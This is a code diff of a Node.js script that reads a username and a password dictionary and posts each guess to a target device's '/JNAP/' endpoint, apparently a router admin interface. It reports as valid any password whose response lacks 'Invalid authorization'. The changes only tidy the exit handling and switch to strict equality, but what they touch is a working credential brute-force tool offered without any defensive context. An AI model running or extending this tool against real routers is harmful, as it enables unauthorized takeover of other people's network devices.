@@ -8,35 +8,29 @@ const Self_Args = process.argv.slice(2)
 
 //Main
 if(!Self_Args.length){
-    console.log("node index.js <url> <username> <dictionary>")
-    process.exit()
+    return console.log("node index.js <url> <username> <dictionary>")
 }
 
-if(!Self_Args[0] || Self_Args[0].indexOf("http") == -1){
-    console.log("Invalid url.")
-    process.exit()
+if(!Self_Args[0] || Self_Args[0].indexOf("http") === -1){
+    return console.log("Invalid url.")
 }
 
 if(!Self_Args[1]){
-    console.log("Invalid username.")
-    process.exit()
+    return console.log("Invalid username.")
 }
 
 if(!Self_Args[2]){
-    console.log("Invalid dictionary.")
-    process.exit()
+    return console.log("Invalid dictionary.")
 }
 
 if(!Fs.existsSync(Self_Args[2])){
-    console.log("Invalid dictionary.")
-    process.exit()
+    return console.log("Invalid dictionary.")
 }
 
 const dictionary_data = Fs.readFileSync(Self_Args[2], "utf8").split("\n")
 
 if(!dictionary_data){
-    console.log("Dictionary data is empty.")
-    process.exit()
+    return console.log("Dictionary data is empty.")
 }
 
 var dictionary_index = 0
@@ -44,8 +38,7 @@ var dictionary_index = 0
 Check()
 async function Check(){
     if(dictionary_index == dictionary_data.length){
-        console.log("Finished checking.")
-        process.exit()
+        return console.log("Finished checking.")
     }
 
     Request.post(`${Self_Args[0]}/JNAP/`, {
@@ -56,7 +49,7 @@ async function Check(){
         },
         body: "{}"
     }, function(err, res, body){
-        if(body.indexOf("Invalid authorization") == -1){
+        if(body.indexOf("Invalid authorization") === -1){
             console.log(`Valid password ${dictionary_data[dictionary_index]}`)
         }else{
             console.log(`Invalid password ${dictionary_data[dictionary_index]}`)
